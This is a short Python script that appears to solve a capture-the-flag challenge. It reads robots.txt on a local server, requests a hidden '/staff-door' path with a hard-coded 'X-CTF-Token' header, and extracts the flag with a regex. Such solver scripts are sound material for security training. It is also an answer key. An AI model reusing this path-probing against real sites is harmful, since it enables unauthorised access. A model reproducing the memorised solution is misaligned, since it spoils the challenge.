#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import urllib.request


def main() -> None:
    base_url = os.getenv('BASE_URL', 'http://127.0.0.1:8080').rstrip('/')
    urllib.request.urlopen(f'{base_url}/robots.txt').read()
    req = urllib.request.Request(
        f'{base_url}/staff-door',
        headers={'X-CTF-Token': 'open-sesame'},
    )
    body = urllib.request.urlopen(req).read().decode()
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
